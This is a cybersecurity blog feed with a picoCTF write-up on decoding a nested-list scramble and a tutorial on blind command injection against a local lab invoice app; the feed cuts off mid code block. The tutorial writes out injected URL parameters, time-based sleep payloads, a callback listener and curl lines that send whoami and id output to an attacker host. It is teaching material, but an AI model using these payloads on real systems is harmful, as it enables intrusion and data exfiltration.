<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-05T12:29:35-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>

<hr />

<h2 id="introduction">Introduction</h2>

<p>In this challenge, we’re handed a Python script that scrambles a flag using a bizarre in-place list mutation with nested references making direct decoding tricky.</p>

<p>Our mission: understand the scramble, decode the nested structure, and extract the original flag.</p>

<hr />

<h4 id="description">Description</h4>
<p>We invented a new cypher that uses “quantum entanglement” to encode the flag. Do you have what it takes to decode it?</p>

<h2 id="the-challenge-code">The Challenge Code</h2>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
import sys

def exit():
  sys.exit(0)

def scramble(L):
  A = L
  i = 2
  while (i &lt; len(A)):
    A[i-2] += A.pop(i-1)
    A[i-1].append(A[:i-2])
    i += 1
    
  return L

def get_flag():
  flag = open('flag.txt', 'r').read()
  flag = flag.strip()
  hex_flag = []
  for c in flag:
    hex_flag.append([str(hex(ord(c)))])

  return hex_flag

def main():
  flag = get_flag()
  cypher = scramble(flag)
  print(cypher)

if __name__ == '__main__':
  main()
</code></pre>
</div>

<p>Here’s the core part:</p>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
def scramble(L):
    A = L
    i = 2
    while (i &lt; len(A)):
        A[i-2] += A.pop(i-1)
        A[i-1].append(A[:i-2])
        i += 1
    return L

def get_flag():
    flag = open('flag.txt', 'r').read().strip()
    hex_flag = [[hex(ord(c))] for c in flag]
    return hex_flag

def main():
    flag = get_flag()
    cypher = scramble(flag)
    print(cypher)

</code></pre>
</div>

<hr />

<h2 id="whats-happening-here">What’s happening here?</h2>

<h3 id="step-1-preparing-the-flag">Step 1: Preparing the flag</h3>

<ul>
  <li>
    <p>The flag is read from <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>
  </li>
  <li>
    <p>Each character is converted to its hexadecimal ASCII code string, wrapped in a list.</p>

    <ul>
      <li>Example: <code class="language-plaintext highlighter-rouge">'p'</code> → <code class="language-plaintext highlighter-rouge">['0x70']</code></li>
    </ul>
  </li>
  <li>
    <p>So the flag becomes a list of lists:<br />
<code class="language-plaintext highlighter-rouge">[['0x70'], ['0x69'], ['0x63'], ['0x6f'], ...]</code></p>
  </li>
</ul>

<h3 id="step-2-the-scramble-function--the-chaos-begins">Step 2: The scramble function — the chaos begins</h3>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
def scramble(L):
    A = L
    i = 2
    while (i &lt; len(A)):
        A[i-2] += A.pop(i-1)
        A[i-1].append(A[:i-2])
        i += 1
    return L
</code></pre>
</div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">A</code> is a reference to the original list <code class="language-plaintext highlighter-rouge">L</code> (no copy).</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">i</code> starts at 2, loops while less than length of <code class="language-plaintext highlighter-rouge">A</code>.</p>
  </li>
  <li>
    <p>Each iteration:</p>

    <ul>
      <li>
        <p><code class="language-plaintext highlighter-rouge">A.pop(i-1)</code> removes the element at index <code class="language-plaintext highlighter-rouge">i-1</code> and returns it.</p>
      </li>
      <li>
        <p>The popped element (a list like <code class="language-plaintext highlighter-rouge">['0x69']</code>) is <strong>concatenated (<code class="language-plaintext highlighter-rouge">+=</code>) to <code class="language-plaintext highlighter-rouge">A[i-2]</code></strong> — so two lists merge.</p>
      </li>
      <li>
        <p>Then, a <strong>slice of the list <code class="language-plaintext highlighter-rouge">A[:i-2]</code></strong> (everything before <code class="language-plaintext highlighter-rouge">i-2</code>) is appended as a nested list inside <code class="language-plaintext highlighter-rouge">A[i-1]</code>.</p>
      </li>
      <li>
        <p><code class="language-plaintext highlighter-rouge">i</code> increments by 1.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>The list shrinks by one each iteration because of <code class="language-plaintext highlighter-rouge">.pop()</code>.</p>
  </li>
</ul>

<hr />

<h2 id="what-does-this-scrambling-actually-do">What does this scrambling actually do?</h2>

<ol>
  <li>
    <p>It merges adjacent elements, combining the hex codes into growing lists.</p>
  </li>
  <li>
    <p>It appends nested slices of earlier parts of the list as <em>recursive references</em> inside other list elements.</p>
  </li>
  <li>
    <p>The nested slices are <strong>not flat copies</strong>, but <em>references</em> to parts of the list.</p>
  </li>
</ol>

<hr />

<h2 id="why-does-this-matter">Why does this matter?</h2>

<ul>
  <li>
    <p>The final structure is a <strong>deeply nested recursive list</strong>, with references to earlier parts of itself.</p>
  </li>
  <li>
    <p>This creates a complex graph-like structure, <strong>not a simple list of hex strings</strong>.</p>
  </li>
  <li>
    <p>Naively flattening or recursively joining all elements will <strong>repeat parts multiple times</strong> or enter infinite loops.</p>
  </li>
</ul>

<hr />

<h2 id="how-to-decode-it">How to decode it?</h2>

<h3 id="step-1-read-the-scrambled-output-a-python-list-from-a-file">Step 1: Read the scrambled output (a Python list) from a file:</h3>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
import ast

with open('scrambled_output.txt') as f:
    scrambled_data = f.read()

data = ast.literal_eval(scrambled_data)
</code></pre>
</div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">ast.literal_eval</code> safely evaluates the string to a nested Python list.</li>
</ul>

<h3 id="step-2-decode-hex-strings-to-ascii-but-skip-nested-references">Step 2: Decode hex strings to ASCII but <strong>skip nested references</strong></h3>

<p>You want to:</p>

<ul>
  <li>
    <p>Decode only <strong>direct hex string elements</strong> on the top level of each list.</p>
  </li>
  <li>
    <p><strong>Ignore nested lists inside each list</strong> because those are recursive references to previous parts they’ll cause duplicates.</p>
  </li>
</ul>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
def decode_node(node, visited=None):
    if visited is None:
        visited = set()

    if isinstance(node, list):
        node_id = id(node)
        if node_id in visited:
            return ''
        visited.add(node_id)

        result = ''
        for el in node:
            if isinstance(el, list):
                continue  # skip nested refs
            elif isinstance(el, str) and el.startswith('0x'):
                result += chr(int(el, 16))
        return result

    elif isinstance(node, str) and node.startswith('0x'):
        return chr(int(node, 16))

    return ''
</code></pre>
</div>

<h3 id="step-3-rebuild-the-flag-linearly-by-decoding-each-top-level-element">Step 3: Rebuild the flag linearly by decoding each top-level element:</h3>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
flag = ""
for item in data:
    flag += decode_node(item)

print(flag)
</code></pre>
</div>

<p>Full code:</p>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
import ast

def decode_node(node, visited=None):
    if visited is None:
        visited = set()

    # If this node is a list
    if isinstance(node, list):
        # To avoid cycles or repeat processing the same slice multiple times,
        # we use id() of the node list object to track visits.
        node_id = id(node)
        if node_id in visited:
            return ''  # already decoded, skip to avoid duplicates or infinite loops
        visited.add(node_id)

        # Decode each element in list sequentially
        result = ''
        for el in node:
            # If el is a list inside the node, it usually is a recursive reference slice,
            # so skip it to avoid duplication.
            if isinstance(el, list):
                continue
            # If string with hex prefix, decode to char
            elif isinstance(el, str) and el.startswith('0x'):
                result += chr(int(el, 16))
        return result

    # If node is a string hex
    elif isinstance(node, str) and node.startswith('0x'):
        return chr(int(node, 16))

    # Otherwise, ignore
    return ''

# Read scrambled data from file
with open('scrambled_output.txt') as f:
    scrambled_data = f.read()

data = ast.literal_eval(scrambled_data)

flag = ""
for item in data:
    flag += decode_node(item)

print(flag)
</code></pre>
</div>

<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>

<p>At its core, Command Injection happens when user-supplied data is passed directly to the system shell without proper sanitization. It’s like handing a stranger the mic and trusting they’ll only say what you expect. But attackers don’t play nice they chain extra commands, escalate privileges, and pivot deeper into your infrastructure.</p>

<p><strong>Remote Command Injection</strong> (RCI) raises the stakes. It’s the same flaw, but now it’s exposed over a network. An attacker can be miles or continents away, injecting commands into a server, IoT device, or web app, turning an external input point into an internal compromise.</p>

<p>These vulnerabilities aren’t theoretical. They’re actively exploited in the wild used to drop web shells, create backdoors, and hijack entire environments. Understanding how they work is the first step to preventing a silent breach.</p>

<h1 id="breaking-down-rce-through-a-simple-invoice-app">Breaking Down RCE Through a Simple Invoice App</h1>

<p>Imagine you log into an app and click <strong>Generate Invoice</strong>. Looks all normal, right? Here’s what happens:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jzNx0nUYgsmHFZJZG2qccA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>You hit the button, and it shows <strong>Invoice #001</strong> with client info and total amount. Nothing sketchy.</li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pRgY0fG5l8m_zkZDdPXuAg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>But check the URL closely:</li>
</ol>
<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1
</code></pre>
</div>

<ol>
  <li>That <code class="language-plaintext highlighter-rouge">file</code> parameter? It’s the weak link. When we start messing with it like running <code class="language-plaintext highlighter-rouge">pwd</code> (print working directory in Linux) the server blindly executes it. Remote Code Execution (RCE).</li>
</ol>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1; pwd
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JjOPZfh85Lzuj3o_h7E-Ng.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<ol>
  <li>Next, we try <code class="language-plaintext highlighter-rouge">ls</code> to list directories. The server spits back the contents.</li>
</ol>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1; ls
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dwZAx8GLOe-oEzPqeKBUlg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>What this means:</strong>
Attackers can slip commands through that parameter, bypassing any security guardrails, and gain full control of your system without breaking a sweat.</p>

<h2 id="detecting-command-injection-from-echoes-to-silence">Detecting Command Injection: From Echoes to Silence</h2>

<p>Detection relies on understanding how the app <em>behaves</em> when fed hostile input. There are two primary categories:</p>

<h3 id="types-of-command-injection">Types of Command Injection</h3>

<table>
  <thead>
    <tr>
      <th>Type</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Verbose</strong></td>
      <td>You get immediate feedback. Think <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">id</code>, or <code class="language-plaintext highlighter-rouge">uname -a</code> if the output is reflected in the response, the target is talking.</td>
    </tr>
    <tr>
      <td><strong>Blind</strong></td>
      <td>No output. The system executes commands silently. You need to analyze behavior, timing, or external signals to confirm execution. This is stealth mode.</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="detecting-blind-command-injection">Detecting Blind Command Injection</h2>

<p>The hardest to spot. There’s no direct output just subtle shifts in behavior. You’re probing in the dark, waiting for the system to flinch.</p>

<h3 id="1-time-based-payloads">1. <strong>Time-Based Payloads</strong></h3>

<p>Use commands that introduce a delay. Examples:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">ping -c 5 127.0.0.1</code> (Linux)</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">timeout /T 5</code> (Windows)</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">sleep 5</code></p>
  </li>
</ul>

<p>If the response time increases proportionally to the command, the target’s bleeding commands under the hood.</p>

<h4 id="2-out-of-band-oob-detection">2. <strong>Out-of-Band (OOB) Detection</strong></h4>

<p>If you control a server (Burp Collaborator, your own webhook, etc.), use payloads like:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
curl http://yourhost.com/$(whoami)
</code></pre>
</div>

<p>If your server receives a pingback? Game over. You’ve got code execution.</p>

<h3 id="3-output-redirection">3. <strong>Output Redirection</strong></h3>

<p>Force output to a file:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
whoami &gt; /tmp/output.txt
</code></pre>
</div>

<p>Then attempt to read it:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
cat /tmp/output.txt
</code></pre>
</div>

<p>This requires multiple steps and possibly multiple injection points, but if you pull it off it’s a solid confirm.</p>

<hr />

<h2 id="the-curl-trick">The Curl Trick</h2>

<p><code class="language-plaintext highlighter-rouge">curl</code> is the Swiss Army knife of testing. Use it to exfil data, confirm execution, or verify external command execution.</p>

<p>Example payload:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
curl http://yourhost.com?data=$(id)
</code></pre>
</div>

<p>If you log the inbound request and see the system’s UID info? You just lit up their internals.</p>

<hr />

<h2 id="final-thoughts">Final Thoughts</h2>

<p>Blind command injection is about patience, observation, and precision. You’re not shooting bullets you’re setting traps. Always consider the OS, encoding quirks, filters, and how input is parsed.</p>

<p>In the field? Don’t just fire payloads. Read the system. Observe delays. Monitor DNS logs. Force OOB callbacks.</p>

<h1 id="blind-command-injection-in-action">Blind Command Injection in Action</h1>

<p>Let’s break down a live scenario.</p>

<p>We’re working with a vulnerable endpoint:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>At first glance, it just pulls a template based on the <code class="language-plaintext highlighter-rouge">file</code> parameter.</p>

<hr />

<h4 id="initial-test-verbose-attempt">Initial Test Verbose Attempt</h4>

<p>We try to inject a simple system command:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1;%20pwd
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0v77pl16YzMQL0mCrGpWFA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>The app responds:</p>

<div class="alert-error">
[!] Template not found: invoice1; pwd`
</div>

<p><strong>What this tells us:</strong>
The input was executed or parsed, but we’re not seeing command output looks like it’s treating everything after <code class="language-plaintext highlighter-rouge">;</code> as part of the filename. So far, no solid confirmation of execution.</p>

<hr />

<h4 id="pivot-to-blind-injection">Pivot to Blind Injection</h4>

<p>Now we go stealth: <strong>time-based testing</strong>.</p>

<p>We craft this payload:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%205
</code></pre>
</div>

<p><strong>Result:</strong>
The page takes ~5 seconds to respond. That’s suspicious.</p>

<p>To confirm, we bump it up:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%2010
</code></pre>
</div>

<p><strong>Now it takes 10 seconds.</strong></p>

<p><strong>Bingo.</strong> That delay is our echo in the void. We’re executing commands we’re just blind to the output.</p>

<hr />

<h4 id="visual-proof-gifscreenshot">Visual Proof (GIF/Screenshot)</h4>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_5R3d3TmgaQ4Cp192pe85w.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Visuals here reinforce what’s happening. The delay is tied to our payload. That’s how we <strong>detect blind command injection</strong>  by controlling time, not output.</p>

<h1 id="out-of-band-oob-command-injection-detection">Out-of-Band (OOB) Command Injection Detection</h1>
<hr />

<p>Blind injection isn’t always about watching timeouts. Sometimes, the system talks <strong>just not to you</strong>. So we make it talk to <strong>us</strong>.</p>

<p>We use <strong>OOB detection</strong> to catch these silent payloads by watching for outbound requests triggered by the app.</p>

<hr />

<h3 id="scenario-setup">Scenario Setup</h3>

<p>Same target:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>We want to test if this endpoint lets us execute system-level commands even if we get no visual output.</p>

<hr />

<h3 id="step-1-set-up-a-listener">Step 1: Set Up a Listener</h3>

<p>We spin up a minimal Python HTTP server to catch any outbound callbacks triggered by tools like <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">wget</code>, or even DNS requests.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-python">
# oob_listener.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class TrapHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f"OOB GET request: {self.path}")
        print(f"[+] Caught request from {self.client_address[0]} | PATH: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ACK')

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    server = HTTPServer(('0.0.0.0', 80), TrapHandler)
    print("[*] Listening for incoming OOB requests on port 80...")
    server.serve_forever()
</code></pre>
</div>

<p><strong>Goal</strong>: Catch any network beacon from the target that hits this listener.</p>

<hr />

<h3 id="step-2-trigger-the-payload">Step 2: Trigger the Payload</h3>

<p>Now that our trap is live, we inject this into the vulnerable URL:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(whoami)
</code></pre>
</div>

<p>Or:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
